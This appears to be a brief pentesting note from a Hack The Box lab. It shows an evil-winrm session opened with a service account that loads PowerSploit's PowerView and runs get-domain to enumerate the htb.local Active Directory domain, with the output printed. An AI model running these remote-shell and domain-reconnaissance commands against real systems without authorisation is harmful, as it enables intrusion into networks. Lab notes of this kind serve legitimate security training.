# PowerSploit
```
$ evil-winrm -i 10.129.240.61 -u svc-account -p redacted -s /usr/share/windows-resources/powersploit/Recon
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-account\Documents> PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-account\Documents> get-domain


Forest                  : htb.local
DomainControllers       : {EXAMPLE.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : EXAMPLE.htb.local
RidRoleOwner            : EXAMPLE.htb.local
InfrastructureRoleOwner : EXAMPLE.htb.local
Name                    : htb.local



*Evil-WinRM* PS C:\Users\svc-account\Documents>
```
